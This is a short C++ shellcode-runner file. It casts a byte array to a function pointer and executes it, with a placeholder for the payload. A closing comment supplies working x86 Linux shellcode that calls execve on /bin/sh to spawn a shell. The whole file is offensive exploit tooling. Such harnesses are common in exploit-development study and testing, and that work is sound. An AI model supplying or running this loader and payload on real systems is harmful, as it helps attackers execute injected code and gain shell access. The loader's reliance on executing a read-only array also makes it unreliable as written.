#!/usr/bin/env c++

#include <cstdio>
#include <cstring>

const char shellcode[] = "PUT SHELLCODE HERE";

int main() {
    printf("Executing shellcode...\n");

    void (*func)() = (void (*)())shellcode;


    func();

    printf("Shellcode executed.\n");

    return 0;
}
/*linux example to get shell
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80*/